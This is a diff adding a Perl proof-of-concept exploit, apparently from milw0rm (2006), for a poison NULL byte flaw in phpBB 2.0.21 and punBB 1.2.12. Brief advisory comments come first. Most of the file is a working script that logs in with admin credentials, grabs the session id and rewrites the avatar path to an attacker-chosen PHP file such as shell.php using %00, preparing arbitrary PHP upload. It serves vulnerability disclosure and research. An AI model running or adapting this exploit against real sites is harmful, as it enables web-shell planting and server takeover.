@@ -1,0 +1,63 @@
+#!/usr/bin/perl -w
+# Author: ShAnKaR
+# Title: multiple PHP application poison NULL byte vulnerability
+# Applications: phpBB 2.0.21, punBB 1.2.12
+# Threat Level: Critical
+# Original advisory (in Russian): http://www.security.nnov.ru/Odocument221.html
+# 
+# Poison  NULL  byte vulnerability for perl CGI applications was described
+# in  [1].  ShAnKaR  noted, that same vulnerability also affects different
+# PHP  applications.  An  example of vulnerable applications are phpBB and
+# punBB.
+# 
+# Vulnerability  can  be  used  to  upload  or  replace arbitrary files on
+# server, e.g. PHP scripts, by adding "poison NULL" (%00) to filename.
+# 
+# In  case  of  phpBB and punBB vulnerability can be exploited by changing
+# location  of avatar file and uploading avatar file with PHP code in EXIF
+# data.
+# 
+# A PoC exploit to change Avatar file location for phpBB:
+# 
+# 
+
+use HTTP::Cookies;
+use LWP;
+use URI::Escape;
+unless(@ARGV){die "USE:\n./phpbb.pl localhost.com/forum/ admin pass images/avatars/shell.php [d(DEBUG)]\n"}
+my $ua = LWP::UserAgent->new(agent=>'Mozilla/4.0 (compatible; Windows 5.1)');
+$ua->cookie_jar( HTTP::Cookies->new());
+
+$url='http://'.$ARGV[0].'/login.php';
+$data="username=".$ARGV[1]."&password=".$ARGV[2]."&login=1";
+my $req = new HTTP::Request 'POST',$url;
+$req->content_type('application/x-www-form-urlencoded');
+$req->content($data);
+my $res = $ua->request($req);
+
+$res=$ua->get('http://'.$ARGV[0].'/login.php');
+$content=$res->content;
+$content=~ m/true&amp;sid=([^"]+)"/g;
+if($ARGV[4]){
+$content=$res->content;
+print $content;
+}
+$url='http://'.$ARGV[0].'/login.php';
+$data="username=".$ARGV[1]."&password=".$ARGV[2]."&login=1&admin=1";
+$req = new HTTP::Request 'POST',$url;
+$req->content_type('application/x-www-form-urlencoded');
+$req->content($data);
+$res = $ua->request($req);
+
+$url='http://'.$ARGV[0].'/admin/admin_board.php?sid='.$1;
+$data="submit=submit&allow_avatar_local=1&avatar_path=".$ARGV[3]."%00";
+$req = new HTTP::Request 'POST',$url;
+$req->content_type('application/x-www-form-urlencoded');
+$req->content($data);
+$res = $ua->request($req);
+if($ARGV[4]){
+$content=$res->content;
+print $content;
+}
+
+# milw0rm.com [2006-09-11]
